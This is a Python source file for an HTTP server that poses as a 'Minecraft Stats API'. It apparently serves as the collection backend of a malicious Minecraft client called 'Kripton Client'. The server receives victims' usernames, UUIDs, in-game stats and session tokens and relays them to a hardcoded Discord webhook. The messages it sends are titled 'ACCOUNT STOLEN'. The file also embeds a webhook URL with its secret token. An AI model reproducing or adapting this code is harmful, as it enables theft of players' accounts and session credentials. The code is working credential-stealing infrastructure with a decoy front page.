from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

WEBHOOK = "https://discord.com/api/webhooks/1457853958667370779/9NEKqkwBwLukL34b1la0YgOExRgFPTo9Oy-OciqmReVrCmwzDMhDwEZiKBjrC55o1Cqx"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Get data
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            data = json.loads(data)
            
            # Extract fields
            username = data.get('username', 'Unknown')
            uuid = data.get('uuid', '')
            server = data.get('server', '')
            token = data.get('token', '')
            money = data.get('money', '0')
            playtime = data.get('playtime', '0h')
            kills = data.get('kills', '0')
            deaths = data.get('deaths', '0')
            skin = data.get('skin', '')
            log_type = data.get('type', 'login')
            
            print(f"Got: {username} on {server}")
            
            # Send to Discord
            try:
                # First message: @here
                ping_data = json.dumps({"content": "@here 🎣 NEW ACCOUNT"}).encode('utf-8')
                ping_req = urllib.request.Request(
                    WEBHOOK,
                    data=ping_data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(ping_req, timeout=5)
                
                # Second message: Embed
                embed = {
                    "title": f"🎣 ACCOUNT STOLEN - {username}",
                    "color": 65280,
                    "description": f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`\n**Money:** `{money}`\n**Playtime:** `{playtime}`\n**Kills:** `{kills}`\n**Deaths:** `{deaths}`",
                    "fields": [
                        {
                            "name": "🔑 Session Token",
                            "value": f"||```{token}```||",
                            "inline": False
                        }
                    ],
                    "thumbnail": {"url": skin if skin else f"https://mc-heads.net/head/{uuid.replace('-', '')}"},
                    "timestamp": "2024-01-01T00:00:00Z",
                    "footer": {"text": "Kripton Client"}
                }
                
                embed_data = json.dumps({"embeds": [embed]}).encode('utf-8')
                embed_req = urllib.request.Request(
                    WEBHOOK,
                    data=embed_data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(embed_req, timeout=5)
                
                print(f"Sent to Discord: {username}")
                
            except urllib.error.HTTPError as e:
                print(f"Discord error {e.code}: {e.reason}")
            except Exception as discord_error:
                print(f"Discord error: {discord_error}")
            
            # Return success
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "message": "Logged"
            }).encode('utf-8'))
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "error",
                "message": str(e)
            }).encode('utf-8'))
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
            <html>
            <body>
                <h1>Minecraft Stats API</h1>
                <p>Server is running...</p>
            </body>
            </html>
        ''')
    
    def log_message(self, format, *args):
        pass

print("🚀 Starting Minecraft Stats Server on port 5000...")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
